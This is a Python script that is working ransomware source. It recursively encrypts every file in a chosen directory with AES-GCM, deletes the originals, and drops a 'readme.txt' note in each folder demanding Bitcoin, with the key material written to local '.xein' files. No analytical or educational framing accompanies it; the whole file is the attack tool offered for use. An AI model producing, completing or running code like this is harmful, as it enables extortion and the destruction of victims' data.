import os
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

def generate_key(password, salt):
    kdf = Scrypt(
        salt=salt, 
        length=32, 
        n=2**14, 
        r=8, 
        p=1, 
        backend=default_backend()
    )
    return kdf.derive(password)

def encrypt_file(key, file_path):
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        iv = os.urandom(12)
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ct = encryptor.update(data) + encryptor.finalize()
        enc_file_path = file_path + ".xein"
        with open(enc_file_path, "wb") as f:
            f.write(iv + encryptor.tag + ct)
        os.remove(file_path)
    except Exception as e:
        print(f"Error encrypting file {file_path}: {e}")

def write_ransom_note(directory):
    note_path = os.path.join(directory, "readme.txt")
    if not os.path.exists(note_path):
        with open(note_path, "w") as f:
            f.write("Your files have been encrypted. Send X amount of Bitcoin to the following address...")

def encrypt_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(key, file_path)
        write_ransom_note(root)

def main():
    password = os.urandom(32)
    salt = os.urandom(16)
    key = generate_key(password, salt)
    target_directory = r"YOUR_DIRECTORY_PATH_HERE"
    encrypt_directory(target_directory, key)
    
    with open("password.xein", "wb") as password_file:
        h = hmac.HMAC(salt, hashes.SHA256(), backend=default_backend())
        h.update(password)
        password_file.write(h.finalize() + password)
    
    salt_file_path = os.path.join(target_directory, "salt.xein")
    with open(salt_file_path, "wb") as salt_file:
        salt_file.write(salt)

if __name__ == "__main__":
    main()
